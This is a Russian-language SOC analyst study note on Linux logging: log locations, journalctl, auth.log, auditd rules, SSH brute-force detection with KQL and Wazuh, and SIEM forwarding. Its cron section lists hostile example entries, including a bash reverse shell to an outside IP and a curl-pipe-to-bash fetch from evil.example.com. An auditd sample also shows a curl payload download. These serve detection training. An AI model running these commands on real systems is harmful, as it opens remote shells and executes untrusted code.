# Linux Logs для SOC

## Зачем это SOC-аналитику

Linux-хосты и серверы — значительная часть инфраструктуры. SOC-аналитик должен:

- Знать структуру журналов Linux и их расположение.
- Уметь работать с journalctl, syslog, auth.log.
- Понимать auditd и его события.
- Видеть аномальную активность: входы, sudo, процессы, сеть.
- Собирать логи в SIEM (Filebeat, Auditbeat, Syslog).

## Структура логов Linux

```
/var/log/
  - syslog          общий системный журнал (Debian/Ubuntu)
  - messages        общий журнал (RHEL/CentOS)
  - auth.log        аутентификация (Debian/Ubuntu)
  - secure          аутентификация (RHEL/CentOS)
  - kern.log        ядро
  - dmesg           сообщения ядра (загрузка)
  - daemon.log      фоновые службы
  - cron.log        задачи cron
  - boot.log        загрузка системы
  - nginx/access.log, nginx/error.log
  - apache2/access.log, apache2/error.log
  - mysql/, postgresql/
  - wtmp            успешные входы (бинарный)
  - btmp            неудачные входы (бинарный)
  - lastlog         последние входы пользователей
  - journal/        логи systemd (binary)
```

## journalctl (systemd)

Основная команда для логирования systemd.

```
journalctl                     все логи
journalctl -u ssh              юнит ssh
journalctl -u nginx --since today
journalctl -b                  с последней загрузки
journalctl --since "1 hour ago"
journalctl -p err              ошибки и выше
journalctl -f                  live tail
journalctl -u ssh -o json      вывод в JSON (для SIEM)
```

Уровни приоритета (-p):

```
0 emerg      система не работает
1 alert      требуется немедленное действие
2 crit       критично
3 err        ошибка
4 warning    предупреждение
5 notice     обычное заметное
6 info       информация (по умолчанию)
7 debug      отладка
```

## auth.log / secure

События аутентификации:

| Событие | Описание |
|---------|----------|
| Successful login | `Accepted password for albert from 10.0.0.5 port 22` |
| Failed login | `Failed password for root from 185.220.101.2 port 52310` |
| Invalid user | `Invalid user admin from 185.220.101.2` |
| sudo | `sudo: albert : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash` |
| SSH key | `Accepted publickey for albert from 10.0.0.5` |
| Break-in attempt | `POSSIBLE BREAK-IN ATTEMPT!` |
| DoS | `Connection reset by peer` |
| su | `su: (to root) albert on pts/0` |

Пример строк:

```
Aug  3 14:22:01 web01 sshd[12345]: Failed password for root from 185.220.101.2 port 52310 ssh2
Aug  3 14:22:01 web01 sshd[12345]: Failed password for invalid user admin from 185.220.101.2 port 52311 ssh2
Aug  3 14:22:05 web01 sudo: albert : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
```

Аномалии:

- Множество Failed password — brute force.
- Вход в нерабочее время.
- Вход с необычного IP/гео.
- Вход root через SSH (должен быть запрещён).
- sudo к необычным командам.

## syslog

Общая система логов. Уровни и facility:

```
Facility:
  auth, authpriv  - аутентификация
  cron            - планировщик
  daemon          - службы
  kern            - ядро
  mail            - почта
  syslog          - система
  user            - пользовательский
  local0-local7   - произвольный

Формат:
  Aug  3 14:22:01 web01 sshd[12345]: Failed password for root from ...
  <месяц> <день> <время> <хост> <процесс>[pid]: <сообщение>
```

## auditd

Мощная система аудита Linux. Правила задаются через auditctl.

Запуск и проверка:

```
systemctl status auditd
auditctl -l         список правил
augenrules --load  загрузка правил
ausearch -k rule   поиск по ключу
ausearch -ts today поиск за сегодня
```

Пример правила (следить за /etc/passwd):

```
auditctl -w /etc/passwd -p wa -k passwd_change
```

Пример правила (отслеживание exec):

```
auditctl -a always,exit -F arch=b64 -S execve -k exec
```

Поиск события:

```
ausearch -k exec -i
```

Типовые event type auditd:

| Тип | Событие |
|-----|---------|
| SYSCALL | системный вызов (execve, open, connect) |
| EXECVE | выполнение программы, аргументы |
| USER_AUTH | аутентификация пользователя |
| USER_ADD | добавление пользователя |
| USER_LOGIN | вход пользователя |
| CONFIG_CHANGE | изменение конфигурации аудита |
| AVC | SELinux решение |

Пример события exec:

```
type=EXECVE msg=audit(1722693601.123:456): argc=2 a0="curl" a1="http://185.220.101.2/payload.sh"
```

## Ключевые источники для SOC (Linux)

Расширенный список для мониторинга:

```
Аутентификация: /var/log/auth.log, /var/log/secure
Входы:          last, lastb, who, w
sudo:           /var/log/auth.log (sudo), journalctl -u sudo
Службы:         journalctl -u SERVICE
Веб-сервер:     /var/log/nginx/access.log, error.log
Базы данных:    /var/log/mysql/error.log
Мониторинг:     /var/log/monit, /var/log/supervisor
Ядро:           dmesg, /var/log/kern.log
Планировщик:    /var/log/cron.log
Загрузка драйверов/USB: /var/log/kern.log (usb, modprobe)
```

## Аналитика: brute force SSH

Признаки в auth.log:

```
Aug  3 14:20:01 web01 sshd[12345]: Failed password for root from 185.220.101.2 port 52310 ssh2
Aug  3 14:20:02 web01 sshd[12346]: Failed password for root from 185.220.101.2 port 52312 ssh2
...
```

Запрос в Elastic (KQL):

```kql
event.category: "authentication"
AND process.name: "sshd"
AND message: "Failed password"
AND source.ip: "185.220.101.2"
```

Правило Wazuh (fail2ban аналог):

```xml
<rule id="100011" level="6">
  <if_sid>5700</if_sid> <!-- sshd failed -->
  <same_source_ip />
  <description>Multiple SSH failed logins from same IP</description>
  <frequency>8</frequency>
  <timeframe>300</timeframe>
  <group>authentication_failures,</group>
</rule>
```

Меры:

1. Заблокировать IP на периметре (NGFW/файрвол).
2. Отключить вход root по SSH.
3. Настроить fail2ban.
4. Использовать ключи вместо паролей.
5. МFA для SSH (при возможности).

## Планировщик (cron)

Аномалии: cron-задачи от неизвестных пользователей, обратный шелл, скачивание payload.

Просмотр:

```
crontab -l
cat /etc/cron.d/*
grep CRON /var/log/cron.log
```

Подозрительное:

```
* * * * * /tmp/payload.sh
* * * * * bash -i >& /dev/tcp/185.220.101.2/4444 0>&1
* * * * * curl http://evil.example.com | bash
```

## Проверка подозрительных процессов

```
ps aux --sort=-%cpu
ss -tunap              сетевые подключения
lsof -i                файлы/сокеты
ls -la /tmp            скрипты в /tmp
find / -perm -4000     setuid
stat /usr/bin/ssh      изменённые файлы
rpm -Va / dpkg -V      проверка целостности пакетов
```

## Логи для SIEM (сбор)

### Filebeat (Elastic)

```yaml
# filebeat.yml
filebeat.inputs:
  - type: filestream
    id: auth-logs
    paths:
      - /var/log/auth.log
      - /var/log/secure
  - type: filestream
    id: syslog-logs
    paths:
      - /var/log/syslog
      - /var/log/messages

output.elasticsearch:
  hosts: ["https://elastic:9200"]
```

### Syslog в SIEM

```
Настроить /etc/rsyslog.conf на отправку:
*.* @10.0.0.10:514   (UDP)
*.* @@10.0.0.10:1514 (TCP)

Или через relay (Logstash, Rsyslog forwarder)
```

## Практика

- Настроить домашний Linux (Ubuntu/CentOS), включить аудит.
- Включить auditd-правила, сгенерировать события.
- Собирать auth.log в Wazuh/Elastic (Filebeat).
- Прогнать brute force (hydra против своего SSH, в изоляции) и посмотреть алерты.
- TryHackMe: Linux Fundamentals, Linux Logs rooms.

## Связанные материалы

- Knowledge/soc/siem-basics.md
- Knowledge/soc/mitre-attack.md
- Knowledge/soc/network-basics.md
- Experience/labs/soc/